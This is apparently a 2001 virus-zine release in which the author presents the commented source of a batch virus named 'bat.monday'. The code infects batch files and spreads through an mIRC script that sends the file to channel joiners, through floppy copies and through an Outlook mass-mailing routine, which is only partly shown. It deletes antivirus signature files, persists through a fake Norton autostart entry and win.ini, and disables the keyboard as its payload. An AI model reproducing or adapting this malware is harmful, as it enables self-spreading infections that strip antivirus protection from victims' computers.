This is my 10th virus, and we have got end of February 2001 now.
I know vortex from the scene. One day I read on his homepage,
that he wants to release a zine. This virus was written for it,
and will be released in/with it. Here are some facts:
-parasitic bat-infector
-searches the current, the parrent and the windows-system-directories
-Outlook worm: uses Alco paul's method to create a vbs
 that send's the batch-virus away
 subject: Another ugly monday?
 body: You don't like mondays? Here's the solution:
 Read our few tips how to get over the next monday.
-mIRC worm
-spreads via disks
-double-"residency": autostart & win.ini
-retro: Norton AntiVirus 2000, AntiVir /9X Personal Edition,
 F-Prot 95, McAfee, Thunderbyte
-payload: disables the keyboard and displays the following message:
 <begin message>
 Do you hate m0ndays, too? No? Perhaps now you do.
 ...
 (if this is a monday;
 did you know: phuckin ME doesn't take day-names as valid dates)
 ...
 bat.monday by philet0ast3r [rRlf]
 <end message>
 I wanted the virus to do this on every monday.
 But then I had to realize, that Windows ME doesn't take day-names
 as valid dates, so the payload gets not executed.
 So I added a little thing: The payload gets now executed on
 every date, that has a 1 in it's number
 ... and on not ME systems: On every monday.
-copies itself as call-back to the windows-directory
-signature: m0n
-fully compatible to Windows ME, Windows 98, Windows 95
 (has been tested)
-size: 4.114 bytes

Well, here is the script (with some comments "-->"; have to be
removed for virus to run) ... phile-name should be fuck_mondays.doc.bat,
but it's not neccessary:

@echo off%_m0n%
ctty nul.m0n
if '%1=='m0n goto m0n%2
set m0n=%0.bat
if not exist %m0n% set m0n=%0
if '%m0n%==' set m0n=autoexec.bat
if exist %winbootdir%\bat.monday.bat goto m0nv
if not exist %m0n% goto 5m0n
find "m0n"<%m0n%>%winbootdir%\bat.monday.bat
:m0nv
command /e:5000 /c %winbootdir%\bat.monday.bat m0n inf

-->the above is the first part of a quite normal infection-routine
-->the hidden call-back-file is also created here

:5m0n
echo [script]>m0n23.bat
echo n0=on 1:JOIN:#:{ >>m0n23.bat
echo n1= /if ( nick == $me ) { halt } >>m0n23.bat
echo n2= /.dcc send $nick c:\fuck_mondays.doc.bat >>m0n23.bat
echo n3=} >>m0n23.bat
if exist c:\mirc\mirc.ini copy m0n23.bat c:\mirc\script.ini

if exist m0n23.bat copy fuck_mondays.doc.bat c:\fuck_mondays.doc.bat

-->the above is the mIRC-worm-routine
-->it makes a mIRC-script-file and places it in a possible mIRC-directory

copy fuck_mondays.doc.bat c:\m0nday.sys
if exist m0n23.bat del c:\programme\norton~1\s32integ.dll
if exist m0n23.bat del c:\programme\f-prot95\fpwm32.dll

if exist m0n23.bat del c:\tbav\tbav.dat
if exist m0n23.bat del c:\programme\avpersonal\antivir.vdf

-->the above is the retro-routine
-->the avs can not scan without those files

if exist %winbootdir%\startmen\programme\autostart\NortonAV.bat goto rdm0n
echo @echo off>m0n5.bat
echo ctty nul>>m0n5.bat
echo if exist c:\fuck_mondays.doc.bat goto 0k>>m0n5.bat
echo copy c:\m0nday.sys c:\fuck_mondays.doc.bat>>m0n5.bat
echo call c:\fuck_mondays.doc.bat>>m0n5.bat
echo :0k>>m0n5.bat
move m0n5.bat %winbootdir%\startmen\programme\autostart\NortonAV.bat

-->the above is the autostart-residency-routine
-->it checks if the virus has been deleted
-->(and so if the win.ini-residency is still working)
-->if yes, it solves the problem

-->the below is the win.ini-residency-routine
-->it infects the win.ini
-->the empty lines are neccessary for windows taking this as true win.ini

:rdm0n
copy c:\fuck_mondays.doc.bat + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
goto dim0n

[windows]
load=c:\fuck_mondays.doc.bat
run=C:\WINDOWS\SYSTEM\cmmpu.exe
NullPort=None

:dim0n
if exist m0n23.bat command /f /c copy c:\fuck_mondays.doc.bat a:\

-->the above is a command line, that makes it possible to copy to diskettes
-->there will be no error if there is no disk in drive a:
-->or if it is writeprotected or full

echo f = "" >>%winbootdir%\m0n.vbs
echo next >>%winbootdir%\m0n.vbs
start %winbootdir%\m0n.vbs

-->the above is the Outlook-worm-routine
-->the created vbs sends the virus to the addresses in the address-book
-->problem: when the vbs gets executed, and an (up to date) av-monitor is active,
-->the system will probably halt, and the av will pop up a warning:
-->"new vbs worm" or something like that
